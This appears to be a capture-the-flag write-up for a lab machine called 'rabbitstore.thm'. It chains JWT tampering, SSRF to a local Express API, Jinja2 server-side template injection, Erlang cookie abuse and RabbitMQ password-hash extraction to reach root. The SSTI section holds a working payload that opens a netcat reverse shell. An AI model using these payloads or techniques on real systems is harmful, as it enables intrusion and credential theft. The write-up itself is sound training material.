...
During this challenge I experimented with a couple of different tools I have not used before being dirsearch and Caido. Dirsearch is another directory brute force tool like Gobuster and Caido is a Burp Suite alternative. It is always good to have hands-on experience with multiple tools even if they serve the same purpose.  

---

Firstly, let’s start our target machine and give it a few minutes to start all relevant services. The room author recommends to use a personal machine connected via VPN to tackle this challenge, rather than the AttackBox. For this room I would also highly recommend adding `rabbitstore.thm` to your `/etc/hosts` file as there will be multiple further domains that need to be accessed via the same IP address later in the room.
...
Port 22 `SSH`: testing showed this was configured for password login.  

Port 80 `HTTP`: visiting `http://rabbitstore.thm` caused a redirect to `http://cloudsite.thm` as such we can add `cloudsite.thm` to our `/etc/hosts` file.  

Port 4369 `epmd`: Erlang Port Mapper Daemon `epmd` is a built-in component that helps Erlang-based applications (including RabbitMQ) discover each other’s distribution ports.
...
```  
#### ⚙️ **Options**   
**-H** Used to set the `HOST` header. Mandatory to discover vhosts served by the same IP/URL as provided via `-u`  
...
Now we got a more helpful error.  
...
If we inspect this `jwt` via [https://jwt.io](https://jwt.io)  we can see that the subscription value is inactive `"subscription":"inactive"`  
...
![MAV - JWT.IO - active.png](./Images/MAV%20-%20JWT.IO%20-%20active.png)
...
All we get is the same `Access denied` message that we received when navigating to `/api/docs` in our browser. 

At this point I thought there should be a way to directly access the file path via the local machine. We know the API server runs on `Express` from earlier recon. When looking up online on I found some information saying files can be accessed via `http://localhost:3000/path` with `3000` being the default port for Express.    
...
I modified the `POST` request by adjusting the items below and initially just sent a blank request.  
```http
POST /api/fetch_messeges_from_chatbot HTTP/1.1
Cookie: jwt=ACTIVE_JWT_TOKEN_STRING
...
```jinja2
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}{% for b in c.__init__.__globals__.values() %}{% if b.__class__ == {}.__class__ %}{% if 'eval' in b.keys() %}{{ b['eval']('__import__(\"os\").popen(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc TARGET_IP PORT >/tmp/f\").read()') }}{% endif %}{% endif %}{% endfor %}{% endif %}{% endfor %}
```
...
Now from our initial scans we know there is a service called epmd (Erlang port mapper daemon) on port `4369` and RabbitMQ on port `25672`. Researching online for `epmd` vulnerabilities I came across this write-up [Erlang distribution RCE and a cookie bruteforcer](https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/)  this provided some useful information, with the first step being to locate the `.erlang.cookie`  
...
ERLANG_COOKIE
```
![Flag2 - cookie.png](./Images/FLag2%20-%20cookie.png)  
...
```
This will output the root users hash.  
...
But this did not work. As such I had a look at the `RabbitMQ` documentation to understand how it manages credentials. [https://www.rabbitmq.com/docs/passwords](https://www.rabbitmq.com/docs/passwords)  

The documentation explains that a random 32-bit salt is prepended to a user’s password before it is hashed. Once the password and salt have been hashed via SHA-256 the whole string is then base64 encoded. So, we need to separate the salt from the password hash to obtain the true password hash.  

This can be done via the following command
```bash
echo -n "USERS_BASE64_PASSWORD_HASH" | base64 -d | xxd -p -c 100
```
Let's break this down
#### ⚙️ **Options**   
**echo** Echoes out the USERS_BASE64_PASSWORD_HASH we enter.  
...
**-c 100** Sets the number of characters per line to 100. If not used the output will wrap lines at the default width.  

Now we have the true password hash of the root user and can try logging in as root.  
```bash
...
```
![Flag2 - root.png](./Images/Flag2%20-%20root.png)

---

## 🧠 Takeaways  
- Hands on experience chaining multiple web vulnerabilities to gain initial access.  
- Learnt about Server-Side Template Injection (SSTI) Vulnerabilities.  
- Managing HTTP request and responses via Caido.  
- Experience interacting with epmd (Erlang port mapper daemon) and RabbitMQ.  
- Further reinforced the importance of ongoing recon and enumeration after each vulnerability was exploited.  
